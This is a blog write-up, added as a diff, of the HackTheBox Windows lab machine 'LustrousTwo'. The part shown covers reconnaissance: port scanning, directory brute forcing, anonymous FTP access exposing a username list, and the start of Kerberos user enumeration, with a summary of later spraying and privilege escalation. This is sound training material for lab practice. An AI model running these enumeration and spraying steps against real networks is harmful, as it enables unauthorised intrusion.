@@ -1,0 +1,1196 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: LustrousTwo</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-lustroustwo">htb-lustroustwo</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#netexec">netexec</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#iis">iis</a> <a class="post-tag" href="/tags#kerberos-web-auth">kerberos-web-auth</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#kerbrute">kerbrute</a> <a class="post-tag" href="/tags#password-spray">password-spray</a> <a class="post-tag" href="/tags#bloodhound">bloodhound</a> <a class="post-tag" href="/tags#bloodhound-python">bloodhound-python</a> <a class="post-tag" href="/tags#curl-kerberos">curl-kerberos</a> <a class="post-tag" href="/tags#firefox-kerberos">firefox-kerberos</a> <a class="post-tag" href="/tags#responder">responder</a> <a class="post-tag" href="/tags#net-ntlmv2">net-ntlmv2</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#dotnet">dotnet</a> <a class="post-tag" href="/tags#dotpeek">dotpeek</a> <a class="post-tag" href="/tags#getst">getst</a> <a class="post-tag" href="/tags#velociraptor">velociraptor</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-07-31T09:00:00+00:00" itemprop="datePublished">Jul 31, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/07/31/htb-lustroustwo.html" style="color: #e6e6e6; text-decoration: none;">HTB: LustrousTwo</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/lustroustwo-cover.webp" type="image/webp"/>
+<img alt="LustrousTwo" class="include_image" loading="lazy" src="/img/lustroustwo-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>LustrousTwo starts with a website that requires Kerberos authentication. I’ll get on an open FTP server and find a list of usernames, which I can spray to get initial authentication on the domain. That auth provides access to the site, and a directory traversal file read which I’ll abuse to find the source DLL for the website. With a bit of .NET reversing, I’ll find users that have extra access, and get a service ticket impersonating them. That access allows me to run commands on the host and get a shell. To escalate, I’ll find a Velociraptor server and it’s key material, allowing me to run commands as system on the host.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/688 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/lustroustwo" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">LustrousTwo</a> <a href="https://hackthebox.com/machines/lustroustwo" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-lustroustwo.webp" type="image/webp"/> <img alt="LustrousTwo" class="img-av" src="/icons/box-lustroustwo.png"/></picture></a><br/><a href="https://hackthebox.com/machines/lustroustwo" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1951281811868250254">31 Jul 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">31 Jul 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds 24 open TCP ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.174
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 13:05 UTC
+...[snip]...
+Nmap scan report for 10.129.234.174
+Host is up, received echo-reply ttl 127 (0.090s latency).
+Scanned at 2025-07-25 13:05:28 UTC for 13s
+Not shown: 65511 filtered tcp ports (no-response)
+PORT      STATE SERVICE          REASON
+21/tcp    open  ftp              syn-ack ttl 127
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49669/tcp open  unknown          syn-ack ttl 127
+50548/tcp open  unknown          syn-ack ttl 127
+52026/tcp open  unknown          syn-ack ttl 127
+52042/tcp open  unknown          syn-ack ttl 127
+55358/tcp open  unknown          syn-ack ttl 127
+55359/tcp open  unknown          syn-ack ttl 127
+55373/tcp open  unknown          syn-ack ttl 127
+
+Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds
+           Raw packets sent: 131053 (5.766MB) | Rcvd: 28 (1.216KB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 <span class="nt">-sCV</span> 10.129.234.174
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 13:06 UTC
+Nmap scan report for 10.129.234.174
+Host is up (0.089s latency).
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 09-06-24  05:20AM       &lt;DIR&gt;          Development
+| 04-14-25  04:44AM       &lt;DIR&gt;          Homes
+| 08-31-24  01:57AM       &lt;DIR&gt;          HR
+| 08-31-24  01:57AM       &lt;DIR&gt;          IT
+| 04-14-25  04:44AM       &lt;DIR&gt;          ITSEC
+| 08-31-24  01:58AM       &lt;DIR&gt;          Production
+|_08-31-24  01:58AM       &lt;DIR&gt;          SEC
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Negotiate
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title.
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-25 13:06:59Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:LUS2DC.Lustrous2.vl
+| Not valid before: 2025-07-25T12:48:36
+|_Not valid after:  2026-07-25T12:48:36
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:LUS2DC.Lustrous2.vl
+| Not valid before: 2025-07-25T12:48:36
+|_Not valid after:  2026-07-25T12:48:36
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:LUS2DC.Lustrous2.vl
+| Not valid before: 2025-07-25T12:48:36
+|_Not valid after:  2026-07-25T12:48:36
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:LUS2DC.Lustrous2.vl
+| Not valid before: 2025-07-25T12:48:36
+|_Not valid after:  2026-07-25T12:48:36
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-07-25T13:08:33+00:00; +7s from scanner time.
+| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
+| Not valid before: 2025-04-13T09:50:31
+|_Not valid after:  2025-10-13T09:50:31
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: LUS2DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2025-07-25T13:07:50
+|_  start_date: N/A
+|_clock-skew: mean: 6s, deviation: 0s, median: 6s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 103.86 seconds
+</span></code></pre></div></div>
+<p>The box shows many of the ports associated with a <a href="/cheatsheets/os#windows-domain-controller">Windows Domain Controller</a>. The domain is <code class="language-plaintext highlighter-rouge">Lustrous2.vl</code>, and the hostname is <code class="language-plaintext highlighter-rouge">LUS2DC</code>. I’ll note the following ports as well:</p>
+<ul>
+<li>FTP (21) is open and allow anonymous login.</li>
+<li>Two remote access ports, WinRM (5985) and RDP (3389). If I get creds for users with permissions to use there, they will be useful.</li>
+<li>HTTP (80), though based on the <code class="language-plaintext highlighter-rouge">nmap</code> results it looks like at least the root is returning 401 Unauthorized.</li>
+</ul>
+<p>All of the ports show a TTL of 127, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Windows one hop away.</p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">netexec</code> to make a <code class="language-plaintext highlighter-rouge">hosts</code> file entry and put it at the top of my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.174 <span class="nt">--generate-hosts-file</span> hosts
+<span class="netexec-protocol">SMB </span><span class="go">        10.129.234.174  445    LUS2DC           </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:LUS2DC) (domain:Lustrous2.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts 
+<span class="go">10.129.234.174     LUS2DC.Lustrous2.vl Lustrous2.vl LUS2DC
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts /etc/hosts | <span class="nb">sudo </span>sponge /etc/hosts
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> notes a clock skew, so I’ll want to make sure to run <code class="language-plaintext highlighter-rouge">sudo ntpdate lus2dc.lustrous2.vl</code> before any Kerberos auth.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Visiting the site by IP returns a 401:</p>
+<picture>
+<source srcset="/img/image-20250725090857360.webp" type="image/webp"/>
+<img alt="image-20250725090857360" class="include_image" loading="lazy" src="/img/image-20250725090857360.png"/>
+</picture>
+<p>Visiting by hostname returns the same error.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers show IIS:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">Unauthorized</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">WWW-Authenticate</span><span class="p">:</span> <span class="s">Negotiate</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">ASP.NET</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 25 Jul 2025 13:20:41 GMT</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+</code></pre></div></div>
+<p>The 401 response error does not match the IIS styling for it’s <a href="/cheatsheets/404#iis">default 404 page</a> like I would expect, but it could still be IIS. However, while many pages like <code class="language-plaintext highlighter-rouge">/0xdf</code> still return 401, there are some I’ll find in the next section that return 404, and those do show the IIS 404:</p>
+<picture>
+<source srcset="/img/image-20250725091350594.webp" type="image/webp"/>
+<img alt="image-20250725091350594" class="include_image" loading="lazy" src="/img/image-20250725091350594.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site to look for any additional paths:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.174
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.234.174
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">401</span><span class="go">      GET        0l        0w        0c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/bin
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/App_Code
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/App_Data
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/Bin
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/App_Browsers
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/app_code
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/app_data
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/app_browsers
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/App_code
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/BIN
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/app_Data
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/App_data
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/App_browsers
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c http://10.129.234.174/app_Browsers
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.174/error%1F_log
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 55s    30002/30002   0s      </span><span class="feroxbuster-green">found</span><span class="go">:15      </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 54s    30000/30000   554/s   http://10.129.234.174/  
+</span></code></pre></div></div>
+<p>Other than being able to verify the 404 page is default, nothing interesting at all.</p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>I’ll try guest authentication, but it returns <code class="language-plaintext highlighter-rouge">STATUS_NOT_SUPPORTED</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.174 <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.129.234.174  445    LUS2DC           </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:LUS2DC) (domain:Lustrous2.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.129.234.174  445    LUS2DC           </span><span class="netexec-logfail">[-]</span><span class="go"> Lustrous2.vl\guest: STATUS_NOT_SUPPORTED 
+</span></code></pre></div></div>
+<p>It also says at the end of the line <code class="language-plaintext highlighter-rouge">NTLM:False</code>. These both indicate that NTLM authentication is not allowed. Trying with Kerberos fails as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.174 <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-k</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.129.234.174  445    LUS2DC           </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:LUS2DC) (domain:Lustrous2.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.129.234.174  445    LUS2DC           </span><span class="netexec-logfail">[-]</span><span class="go"> Lustrous2.vl\guest: KDC_ERR_ETYPE_NOSUPP
+</span></code></pre></div></div>
+<p>There’s no point in trying dummy names with Kerberos as that will just fail.</p>
+<h3 id="ftp---tcp-21">FTP - TCP 21</h3>
+<p>As <code class="language-plaintext highlighter-rouge">nmap</code> identified, using the username anonymous with an empty password allows access to the FTP server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ftp anonymous@lus2dc.lustrous2.vl
+<span class="go">Connected to LUS2DC.Lustrous2.vl.
+220 Microsoft FTP Service
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+</span><span class="gp">ftp&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>There are several directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt; </span><span class="nb">ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||50679|)
+150 Opening ASCII mode data connection.
+09-06-24  05:20AM       &lt;DIR&gt;          Development
+04-14-25  04:44AM       &lt;DIR&gt;          Homes
+08-31-24  01:57AM       &lt;DIR&gt;          HR
+08-31-24  01:57AM       &lt;DIR&gt;          IT
+04-14-25  04:44AM       &lt;DIR&gt;          ITSEC
+08-31-24  01:58AM       &lt;DIR&gt;          Production
+08-31-24  01:58AM       &lt;DIR&gt;          SEC
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>Five of the seven directories (<code class="language-plaintext highlighter-rouge">Development</code>, <code class="language-plaintext highlighter-rouge">HR</code>, <code class="language-plaintext highlighter-rouge">IT</code>, <code class="language-plaintext highlighter-rouge">Production</code>, and <code class="language-plaintext highlighter-rouge">SEC</code>) show as empty. They could be empty, or the anonymous user just can list them.</p>
+<p><code class="language-plaintext highlighter-rouge">ITSEC</code> has a single document which I’ll download:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt; </span><span class="nb">cd </span>ITSEC
+<span class="go">250 CWD command successful.
+</span><span class="gp">ftp&gt; </span><span class="nb">ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||50707|)
+125 Data connection already open; Transfer starting.
+09-07-24  03:50AM                  207 audit_draft.txt
+226 Transfer complete.
+</span><span class="gp">ftp&gt; </span>get audit_draft.txt
+<span class="go">local: audit_draft.txt remote: audit_draft.txt
+229 Entering Extended Passive Mode (|||50712|)
+125 Data connection already open; Transfer starting.
+100% |*************************************************************************|   207        2.27 KiB/s    00:00 ETA
+226 Transfer complete.
+207 bytes received in 00:00 (2.26 KiB/s)
+</span></code></pre></div></div>
+<p>The file has a todo list of security things:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Audit Report Issue Tracking
+
+[Fixed] NTLM Authentication Allowed
+[Fixed] Signing &amp; Channel Binding Not Enabled
+[Fixed] Kerberoastable Accounts
+[Fixed] SeImpersonate Enabled
+
+[Open] Weak User Passwords
+</code></pre></div></div>
+<p>I’ll keep the weak passwords hint in mind.</p>
+<p>The <code class="language-plaintext highlighter-rouge">Homes</code> directory has a bunch of users:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt; </span><span class="nb">ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||50716|)
+125 Data connection already open; Transfer starting.
+09-07-24  12:03AM       &lt;DIR&gt;          Aaron.Norman
+09-07-24  12:03AM       &lt;DIR&gt;          Adam.Barnes
+09-07-24  12:03AM       &lt;DIR&gt;          Amber.Ward
+09-07-24  12:03AM       &lt;DIR&gt;          Andrea.Smith
+09-07-24  12:03AM       &lt;DIR&gt;          Ann.Lynch
+09-07-24  12:03AM       &lt;DIR&gt;          Callum.Oliver
+09-07-24  12:03AM       &lt;DIR&gt;          Carly.Walker
+09-07-24  12:03AM       &lt;DIR&gt;          Chelsea.Smith
+09-07-24  12:03AM       &lt;DIR&gt;          Chloe.Hammond
+09-07-24  12:03AM       &lt;DIR&gt;          Christopher.Lawson
+09-07-24  12:03AM       &lt;DIR&gt;          Claire.Parry
+09-07-24  12:03AM       &lt;DIR&gt;          Darren.Lewis
+09-07-24  12:03AM       &lt;DIR&gt;          Deborah.Jones
+09-07-24  12:03AM       &lt;DIR&gt;          Dominic.West
+09-07-24  12:03AM       &lt;DIR&gt;          Duncan.Smith
+09-07-24  12:03AM       &lt;DIR&gt;          Elaine.Gallagher
+09-07-24  12:03AM       &lt;DIR&gt;          Eleanor.Gregory
+09-07-24  12:03AM       &lt;DIR&gt;          Emma.Bell
+09-07-24  12:03AM       &lt;DIR&gt;          Francesca.Norman
+09-07-24  12:03AM       &lt;DIR&gt;          Gary.Richards
+09-07-24  12:03AM       &lt;DIR&gt;          Gerard.Ward
+09-07-24  12:03AM       &lt;DIR&gt;          Glenn.Williams
+09-07-24  12:03AM       &lt;DIR&gt;          Graeme.Pritchard
+09-07-24  12:03AM       &lt;DIR&gt;          Harriet.Richardson
+09-07-24  12:03AM       &lt;DIR&gt;          Henry.Connor
+09-07-24  12:03AM       &lt;DIR&gt;          Howard.Robinson
+09-07-24  12:03AM       &lt;DIR&gt;          Jacqueline.Phillips
+09-07-24  12:03AM       &lt;DIR&gt;          Janice.Collier
+09-07-24  12:03AM       &lt;DIR&gt;          Jasmine.Johnson
+09-07-24  12:03AM       &lt;DIR&gt;          Joan.Wall
+09-07-24  12:03AM       &lt;DIR&gt;          Judith.Francis
+09-07-24  12:03AM       &lt;DIR&gt;          Justin.Williams
+09-07-24  12:03AM       &lt;DIR&gt;          Kyle.Hussain
+09-07-24  12:03AM       &lt;DIR&gt;          Kyle.Lloyd
+09-07-24  12:03AM       &lt;DIR&gt;          Lawrence.Bryan
+09-07-24  12:03AM       &lt;DIR&gt;          Leah.Elliott
+09-07-24  12:03AM       &lt;DIR&gt;          Lewis.Khan
+09-07-24  12:03AM       &lt;DIR&gt;          Liam.Wheeler
+09-07-24  12:03AM       &lt;DIR&gt;          Lisa.Begum
+09-07-24  12:03AM       &lt;DIR&gt;          Louis.Phillips
+09-07-24  12:03AM       &lt;DIR&gt;          Lydia.Parker
+09-07-24  12:03AM       &lt;DIR&gt;          Malcolm.Yates
+09-07-24  12:03AM       &lt;DIR&gt;          Marie.Hill
+09-07-24  12:03AM       &lt;DIR&gt;          Martin.Hamilton
+09-07-24  12:03AM       &lt;DIR&gt;          Mathew.Roberts
+09-07-24  12:03AM       &lt;DIR&gt;          Melissa.Thompson
+09-07-24  12:03AM       &lt;DIR&gt;          Nathan.Carter
+09-07-24  12:03AM       &lt;DIR&gt;          Nicola.Clarke
+09-07-24  12:03AM       &lt;DIR&gt;          Nicola.Hall
+09-07-24  12:03AM       &lt;DIR&gt;          Nigel.Lee
+09-07-24  12:03AM       &lt;DIR&gt;          Pamela.Taylor
+09-07-24  12:03AM       &lt;DIR&gt;          Robert.Russell
+09-07-24  12:03AM       &lt;DIR&gt;          Ryan.Davies
+09-07-24  12:03AM       &lt;DIR&gt;          Ryan.Moore
+09-07-24  12:03AM       &lt;DIR&gt;          Ryan.Rowe
+09-07-24  12:03AM       &lt;DIR&gt;          Samantha.Smith
+09-07-24  12:03AM       &lt;DIR&gt;          Sara.Matthews
+09-07-24  12:03AM       &lt;DIR&gt;          ShareSvc
+09-07-24  12:03AM       &lt;DIR&gt;          Sharon.Birch
+09-07-24  12:03AM       &lt;DIR&gt;          Sharon.Evans
+09-07-24  12:03AM       &lt;DIR&gt;          Stacey.Barber
+09-07-24  12:03AM       &lt;DIR&gt;          Stacey.Griffiths
+09-07-24  12:03AM       &lt;DIR&gt;          Stephanie.Baxter
+09-07-24  12:03AM       &lt;DIR&gt;          Stephanie.Davies
+09-07-24  12:03AM       &lt;DIR&gt;          Steven.Sutton
+09-07-24  12:03AM       &lt;DIR&gt;          Susan.Johnson
+09-07-24  12:03AM       &lt;DIR&gt;          Terence.Jordan
+09-07-24  12:03AM       &lt;DIR&gt;          Thomas.Myers
+09-07-24  12:03AM       &lt;DIR&gt;          Tony.Davies
+09-07-24  12:03AM       &lt;DIR&gt;          Victoria.Williams
+09-07-24  12:03AM       &lt;DIR&gt;          Wayne.Taylor
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>I’m not able to list files in any of them, but it does provide a list of potential usernames.</p>
+<h3 id="kerberos---tcp-88">Kerberos - TCP 88</h3>
+<p>I’ll use Kerberos with the list of usernames from FTP to validate if these are legit users on the domain:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kerbrute userenum <span class="nt">-d</span> lustrous2.vl <span class="nt">--dc</span> lus2dc.lustrous2.vl <span class="nb">users</span>
+<span class="go">
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 07/25/25 - Ronnie Flathers @ropnop
+
+2025/07/25 14:03:24 &gt;  Using KDC(s):
+2025/07/25 14:03:24 &gt;   lus2dc.lustrous2.vl:88
